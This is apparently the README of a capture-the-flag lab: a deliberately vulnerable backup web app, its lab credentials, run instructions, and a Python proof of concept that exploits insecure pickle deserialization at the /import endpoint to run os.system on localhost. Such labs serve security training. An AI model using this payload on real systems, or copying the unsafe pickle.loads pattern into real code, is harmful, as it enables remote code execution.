# Backup Management System – CTF Lab

## Folder Structure

```
backend/
├── app.py
├── requirements.txt
├── Dockerfile
├── docker-compose.yml
├── .env
├── templates/
│   ├── login.html
│   └── dashboard.html
└── utils/
    ├── __init__.py
    ├── auth.py
    └── session.py
```

## Credentials

| User  | Password          |
|-------|-------------------|
| admin | Adm1n@Backup2024! |
| guest | guest             |

## Run Instructions

### Option A – Docker Compose (recommended)

```bash
sudo docker compose up --build
```

App available at: http://localhost:9000

### Option B – Local

```bash
cd backend
pip install -r requirements.txt
# start redis locally first
redis-server &
python app.py
```

---

## Vulnerability

The `/import` endpoint passes user-controlled bytes directly to `pickle.loads()` after base64 decoding.

### Exploit PoC (Python)

```python
import pickle, base64, os, requests

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

payload = base64.b64encode(pickle.dumps(Exploit()))

s = requests.Session()
s.post("http://localhost:9000/login", data={"username": "guest", "password": "guest"})
s.post("http://localhost:9000/import", files={"session_file": ("evil.bak", payload)})
```
